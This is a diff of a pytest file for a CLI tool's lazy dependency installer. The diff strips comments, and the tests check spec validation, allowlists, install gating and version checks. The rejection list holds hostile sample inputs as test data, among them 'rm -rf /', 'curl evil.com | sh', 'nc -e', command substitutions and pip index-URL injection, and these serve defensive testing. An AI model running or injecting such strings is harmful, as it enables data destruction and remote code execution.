@@ -18,9 +18,6 @@ import pytest
 import tools.lazy_deps as ld
 
 
-# ---------------------------------------------------------------------------
-# Spec safety
-# ---------------------------------------------------------------------------
 
 
 class TestSpecSafety:
@@ -33,7 +30,7 @@ class TestSpecSafety:
         "google-api-python-client>=2.100,<3",
         "youtube-transcript-api>=1.2.0",
         "qrcode>=7.0,<8",
-        "package",  # bare name, no version
+        "package",
         "package==1.0.0",
         "package~=1.0",
     ])
@@ -41,26 +38,20 @@ class TestSpecSafety:
         assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"
 
     @pytest.mark.parametrize("spec", [
-        # URL-shaped → rejected (no remote origin override allowed)
         "git+https://github.com/foo/bar.git",
         "https://example.com/foo.tar.gz",
-        # File path → rejected
         "/etc/passwd",
         "./local-malware",
         "../escape",
-        # Shell metacharacters → rejected
         "package; rm -rf /",
         "package && curl evil.com | sh",
         "package`whoami`",
         "package$(whoami)",
         "package|nc -e",
-        # Pip flag injection → rejected
         "--index-url=http://evil/",
         "-r requirements.txt",
-        # Whitespace control chars → rejected
         "package\nshell-injection",
         "package\rmore",
-        # Empty / overly long → rejected
         "",
         "x" * 500,
     ])
@@ -69,9 +60,6 @@ class TestSpecSafety:
             f"expected {spec!r} to be rejected"
 
 
-# ---------------------------------------------------------------------------
-# Allowlist enforcement
-# ---------------------------------------------------------------------------
 
 
 class TestAllowlist:
@@ -86,27 +74,19 @@ class TestAllowlist:
         assert ld.feature_install_command("not.real", venv_pip=True) is None
 
     def test_feature_install_command_venv_pip_targets_interpreter(self):
-        # venv_pip=True must target the running interpreter's pip (correct in
-        # every install layout, immune to PEP 668) and carry the same specs
-        # as the default uv form.
         import sys as _sys
         default = ld.feature_install_command("platform.teams")
         venv = ld.feature_install_command("platform.teams", venv_pip=True)
         assert default is not None and venv is not None
         assert venv.startswith(f"{_sys.executable} -m pip install ")
         assert default.startswith("uv pip install ")
-        # Same spec tail on both forms.
         assert venv.split(" -m pip install ", 1)[1] == default.split("uv pip install ", 1)[1]
 
 
-# ---------------------------------------------------------------------------
-# allow_lazy_installs gating
-# ---------------------------------------------------------------------------
 
 
 class TestSecurityGating:
     def test_disabled_via_config_raises(self, monkeypatch):
-        # Pretend honcho is missing AND lazy installs are disabled.
         monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("packageX>=1.0,<2",))
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
         monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
@@ -115,8 +95,6 @@ class TestSecurityGating:
 
 
     def test_config_failure_fails_open(self, monkeypatch):
-        # If config can't be read at all, we ALLOW installs rather than
-        # blocking the user out of their own backends.
         monkeypatch.delenv("DAEDALUS_DISABLE_LAZY_INSTALLS", raising=False)
         monkeypatch.setattr(
             "daedalus_cli.config.load_config",
@@ -125,27 +103,20 @@ class TestSecurityGating:
         assert ld._allow_lazy_installs() is True
 
 
-# ---------------------------------------------------------------------------
-# ensure() happy/sad paths
-# ---------------------------------------------------------------------------
 
 
 class TestEnsure:
     def test_already_satisfied_is_noop(self, monkeypatch):
-        # If the package is importable, ensure() returns without calling pip.
         monkeypatch.setitem(ld.LAZY_DEPS, "test.satisfied", ("zzzfake>=1",))
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
-        # If pip were called, this would fail loudly.
         monkeypatch.setattr(
             ld, "_venv_pip_install",
             lambda *a, **kw: pytest.fail("pip should not be called"),
         )
-        ld.ensure("test.satisfied", prompt=False)  # no exception
+        ld.ensure("test.satisfied", prompt=False)
 
 
     def test_install_succeeds_but_still_missing_raises(self, monkeypatch):
-        # Pip says success but the package still isn't importable
-        # (e.g. site-packages caching, wrong python). Surface this.
         monkeypatch.setitem(ld.LAZY_DEPS, "test.cache", ("zzzfake>=1",))
         monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
         monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
@@ -157,9 +128,6 @@ class TestEnsure:
             ld.ensure("test.cache", prompt=False)
 
 
-# ---------------------------------------------------------------------------
-# is_available
-# ---------------------------------------------------------------------------
 
 
 class TestIsAvailable:
@@ -173,15 +141,6 @@ class TestIsAvailable:
         assert ld.is_available("test.miss") is False
 
 
-# ---------------------------------------------------------------------------
-# Version-aware _is_satisfied (Piece B — "stale pin" detection)
-#
-# The original implementation returned True the moment the package name
-# was importable, ignoring the spec's version range. That meant pin bumps
-# in LAZY_DEPS never propagated to users who already lazy-installed the
-# backend at an older version. _is_satisfied now parses the spec and
-# checks the installed version against the constraint.
-# ---------------------------------------------------------------------------
 
 
 class TestIsSatisfiedVersionAware:
@@ -194,7 +153,6 @@ class TestIsSatisfiedVersionAware:
                 return installed_versions[pkg]
             raise PackageNotFoundError(pkg)
 
-        # Patch at the import site lazy_deps uses (inside the function).
         import importlib.metadata as _md
         monkeypatch.setattr(_md, "version", _version)
 
@@ -209,13 +167,10 @@ class TestIsSatisfiedVersionAware:
 
 
     def test_bare_package_name_presence_is_enough(self, monkeypatch):
-        # No version constraint — presence alone counts as satisfied.
         self._fake_version(monkeypatch, {"somepkg": "1.0.0"})
         assert ld._is_satisfied("somepkg") is True
 
     def test_extras_block_in_spec_is_stripped(self, monkeypatch):
-        # mautrix[encryption]==0.21.0 — the [encryption] block must not
-        # confuse the specifier parser.
         self._fake_version(monkeypatch, {"mautrix": "0.21.0"})
         assert ld._is_satisfied("mautrix[encryption]==0.21.0") is True
 
@@ -293,9 +248,6 @@ class TestIsSatisfiedVersionAware:
         assert tuple(installed) == expected_repairs
 
 
-# ---------------------------------------------------------------------------
-# active_features + refresh_active_features (Piece A — daedalus update wiring)
-# ---------------------------------------------------------------------------
 
 
 class TestActiveFeatures:
@@ -305,9 +257,6 @@ class TestActiveFeatures:
 
 
     def test_shared_dependency_does_not_activate_feature(self, monkeypatch):
-        # asyncpg is a generic dependency that may be installed for unrelated
-        # reasons. It must not make daedalus update try to refresh Matrix unless
-        # the Matrix anchor package (mautrix) is present.
         monkeypatch.setattr(
             ld, "_is_present",
             lambda spec: ld._pkg_name_from_spec(spec) == "asyncpg",
@@ -321,12 +270,6 @@ class TestRefreshActiveFeatures:
         assert ld.refresh_active_features() == {}
 
     def test_windows_matrix_refresh_is_skipped_before_pip(self, monkeypatch):
-        # Matrix E2EE pulls python-olm, which has no native Windows wheel/build
-        # path. `daedalus update` must not retry that doomed install every run.
-        #
-        # The subject here is the *consumer* — refresh_active_features honouring
-        # the gate before pip — so we monkeypatch lazy_deps' own platform probe
-        # instead of faking the host, which keeps this covered on Linux too.
         monkeypatch.setattr(
             ld,
             "_unsupported_feature_reason",
@@ -352,8 +295,6 @@ class TestRefreshActiveFeatures:
 
     @pytest.mark.windows_only
     def test_matrix_probe_reports_unsupported_on_real_windows(self):
-        # The probe itself keys off the real host: patching sys.platform only
-        # proved the string, never that Windows actually hits this gate.
         assert "unsupported on Windows" in (
             ld._unsupported_feature_reason("platform.matrix") or ""
         )
@@ -363,8 +304,6 @@ class TestRefreshActiveFeatures:
         monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
         monkeypatch.setitem(ld.LAZY_DEPS, "a.ok", ("pkga==1.0",))
         monkeypatch.setitem(ld.LAZY_DEPS, "b.fail", ("pkgb==1.0",))
-        # a.ok: already satisfied → "current"
-        # b.fail: missing + install fails → "failed:"
         def fake_satisfied(spec):
             return ld._pkg_name_from_spec(spec) == "pkga"
         monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
@@ -378,16 +317,6 @@ class TestRefreshActiveFeatures:
         assert result["b.fail"].startswith("failed:")
 
 
-# ---------------------------------------------------------------------------
-# install_specs — manifest-driven installs (dashboard memory providers etc.)
-#
-# NS-605: the dashboard's memory-provider setup endpoint used to shell out
-# to `uv pip install --python sys.executable`, which fails with a permission
-# error on the sealed hosted venv. install_specs routes those installs
-# through the same environment-aware pipeline as ensure(): venv-scoped on
-# normal installs, redirected to the durable target on immutable images,
-# and cleanly refused (with a reason) when installs are gated off.
-# ---------------------------------------------------------------------------
 
 
 class TestInstallSpecs:
@@ -440,8 +369,6 @@ class TestInstallSpecs:
         monkeypatch.setattr(
             "daedalus_cli.config.load_config", lambda: {}, raising=False
         )
-        # Contract: install_specs never raises — even an unexpected installer
-        # crash comes back as a failed result the caller can render.
         def boom(specs, **kw):
             raise RuntimeError("disk on fire")
         monkeypatch.setattr(ld, "_venv_pip_install", boom)
